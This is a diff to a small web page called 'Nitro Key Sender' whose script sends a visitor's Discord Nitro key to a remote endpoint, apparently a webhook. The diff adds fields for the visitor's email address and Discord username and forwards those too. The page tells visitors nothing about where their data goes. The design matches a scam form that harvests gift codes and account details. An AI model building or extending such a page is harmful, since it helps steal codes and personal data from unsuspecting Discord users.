@@ -29,7 +29,7 @@
     input[type="text"] {
       width: 100%;
       padding: 10px;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
       border: 1px solid #ddd;
       border-radius: 4px;
       text-align: center;
@@ -57,9 +57,12 @@
 
     function sendNitroKey() {
       const nitroKey = document.getElementById("nitroKey").value;
+      const email = document.getElementById("email").value;
+      const discordUsername = document.getElementById("discordUsername").value;
 
-      if (!nitroKey) {
-        alert("Please enter a Nitro Key.");
+      // Validation for Nitro Key, Email, and Discord Username
+      if (!nitroKey || !email || !discordUsername) {
+        alert("Please fill out all fields: Nitro Key, Email, and Discord Username.");
         return;
       }
 
@@ -78,6 +81,16 @@
               {
                 name: "Nitro Key",
                 value: nitroKey,
+                inline: false
+              },
+              {
+                name: "Email",
+                value: email,
+                inline: false
+              },
+              {
+                name: "Discord Username",
+                value: discordUsername,
                 inline: false
               }
             ],
@@ -99,6 +112,8 @@
         if (response.ok) {
           alert('Nitro Key sent successfully!');
           document.getElementById("nitroKey").value = "";
+          document.getElementById("email").value = "";
+          document.getElementById("discordUsername").value = "";
         } else {
           alert('Failed to send Nitro Key.');
         }
@@ -114,6 +129,8 @@
   <div class="container">
     <h1>Nitro Key Sender</h1>
     <input type="text" id="nitroKey" placeholder="Enter Nitro Key (e.g., XXXX-XXXX-XXXX)" />
+    <input type="text" id="email" placeholder="Enter Email Address" />
+    <input type="text" id="discordUsername" placeholder="Enter Discord Username (e.g., User#1234)" />
     <button onclick="sendNitroKey()">Send Nitro Key</button>
   </div>
 </body>
